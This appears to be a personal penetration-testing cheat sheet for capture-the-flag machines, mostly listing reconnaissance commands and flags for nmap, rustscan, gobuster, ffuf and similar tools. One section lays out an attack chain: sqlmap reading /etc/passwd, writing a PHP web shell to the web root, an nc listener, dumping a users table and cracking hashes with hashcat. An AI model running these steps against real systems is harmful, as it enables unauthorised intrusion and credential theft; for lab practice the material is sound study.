1) rustscan --ulimit 10000 -a IP -- -sC -Pn
or
   nmap -sCV -p- I
MUST:    nmap -sCV 10.10.XX.XX --script vuln -T5
         nmap -A -p- 10.10.XX.XX -T4

Nmap flag	Description
-sV	   Attempts to determine the version of the services running
-p <x> or -p-	Port scan for port <x> or scan all ports
-Pn	   Disable host discovery and scan for open ports
-A	      Enables OS and version detection, executes in-build scripts for further enumeration 
-sC	   Scan with the default Nmap scripts
-v	      Verbose mode
-sU	   UDP port scan
-sS	   TCP SYN port scan



2) dirsearch -u and gobuster vhost -u http:// -w /usr/share/wordlists/dirb/small.txt -k --append-domain

feroxbuster -u http://xxxx.htb               (much faster)
feroxbuster -u http://xxx.htb/ -w /usr/share/seclists/Discovery/WebContent/raft-medium-directories.txt -x php,html,js,json,txt,log -t 50 -e


dirsearch -u http://furni.htb/ -e php,html,txt -t 50



3) (FOR DIR ENUMERATION ON YOUR KNOWN DOMAINS)--> gobuster dir -u http://<example.domain.com>/ -w /usr/share/wordlists/dirb/common.txt -b 404,403
 or


Gobuster flag	Description
-e	            Print the full URLs in your console
-u	            The target URL
-w	            Path to your wordlist
-U and -P	   Username and Password for Basic Auth
-p <x>	      Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth




4) ffuf -c -u "http://<domain>/FUZZ" -w /usr/share/wordlists/dirb/common.txt 
   ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://<ip>' -H "Host:FUZZ.<domain.htb>" -fs 178
   ffuf -w /usr/share//wordlists/bitquark_subdomains_top100K.txt -H "Host:FUZZ.xxxx.xxx" -u http://xxxx.xxx/ -mc 200 

5) whatweb name.htb        (we fingerprinting the web technologies)

6) curl -I http://xxx.htb/      (we check the headers only) 

7) dig example.com

------------------------------------------------------------------------------------------------------------------
The best way to do this is the following:

1. rustscan -a <IP>
taking the open ports

2. nmap -sC -sV -p53,80,88,135,<...all the open ports> <IP>
scan with nmap only the open ports since nmap gives a more detailed scan

3. nmap -Pn -sU -top-ports 1000 <IP>
last do a scan for udp ports just in case

-----------------------------------------------------------------------------------------------------------------
A good practise

1.nmap or rustscan like above
2. if you can create a user do it
3. in when ever field yyou can commit something like username or after some url or image or dont know, use burp for it
and then copy the request in a sql.txt and use:

   sqlmap -r sql.txt --batch
try all the possible fields and forms
4.good idea is: sqlmap -r sql.txt -p url --batch --sql-query="SELECT LOAD_FILE('/etc/passwd')"

or just upload a file with sqli:
 sqlmap -r sql.txt -p url --file-write-/home/kali/chal/shell.php --file-dest=/var/www/vote/shellz.php --batch
and open your nc -lvnp <port>

then jus go at /var/www/html and find some confs or dbs
in www-data shell do:
mysql -u <usernameyufound> -p <tablenameyoufound>
and then put the password
then
SHOW DATABASES;
USE name;
SHOW TABLES;
SELECT * FROM users LIMIT 10;
and crack some hashes with:
hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------
Some recon things :)

1. robots.txt is usefull, there you see what pages are disallowed from crawlers
2. security.txt too  (try for xxxx.com/security.txt)
3. /.well-known/security.txt might have some security isssues there too
4. dig example.com       (taking the ip to resolve)
5. curl http://51.158.xx.xx/ -v    | jq .       (usefull info and the jq makes it nice)
5. curl https://hackycorp.com/ -v -H "Host: test"      (usefull info)
6. at the url of site, click the lock with the cross red line. There you  inspect SSL certificates for valuable information 
and leverage alternative names to access different parts of a web application.
maybe something like 1095u89j1.example.com works.
7. some times it helps to change http and https and watch again for the above (TLS certs)
8. ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u https://xxx.com -H "Host: FUZZ.xxx.com" -fr recon_07
(with fr you dont see all the responses that have recon 07)
9.
